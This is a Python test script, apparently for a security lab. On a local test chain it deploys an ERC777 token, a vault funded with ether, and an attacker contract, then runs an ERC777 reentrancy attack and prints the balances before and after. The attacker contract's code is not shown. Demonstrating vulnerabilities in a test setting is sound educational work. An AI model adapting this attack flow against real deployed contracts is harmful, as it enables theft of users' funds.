from wake.testing import *
from typing import List

from pytypes.contracts.erc777.token import MyERC777Token
from pytypes.contracts.erc777.vault import Exchange
from pytypes.contracts.erc777.attacker import Attacker
from pytypes.contracts.erc777.ERC1820Registry import ERC1820Registry

from pytypes.node_modules.openzeppelinsolidity340.token.ERC777 import ERC777

REGISTORY = ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)

@default_chain.connect()
def test_default():
    print("---------------------ERC777 Reentrancy---------------------")
    victim = default_chain.accounts[0]
    attacker = default_chain.accounts[1]

    e = ERC1820Registry.deploy()
    REGISTORY.code = e.code

    erc777 = MyERC777Token.deploy(1000*(10**18), [victim], from_=victim)

    exchange = Exchange.deploy(erc777, value="1000 ether")

    erc777.transfer(exchange, 1000*(10**18), from_=victim)
    
    attacker_contract = Attacker.deploy(erc777.address, exchange.address, value="100 ether", from_=attacker)
    print("Vault token   : ", erc777.balanceOf(exchange))
    print("Vault eth     : ", exchange.balance)
    print("Attacker token: ", erc777.balanceOf(attacker_contract))
    print("Attacker eth  : ", attacker_contract.balance)

    print("---------------------attack---------------------")

    tx = attacker_contract.attack(from_=attacker)
    print(tx.call_trace)

    print("Vault token   : ", erc777.balanceOf(exchange))
    print("Vault eth     : ", exchange.balance)
    print("Attacker token: ", erc777.balanceOf(attacker_contract))
    print("Attacker eth  : ", attacker_contract.balance)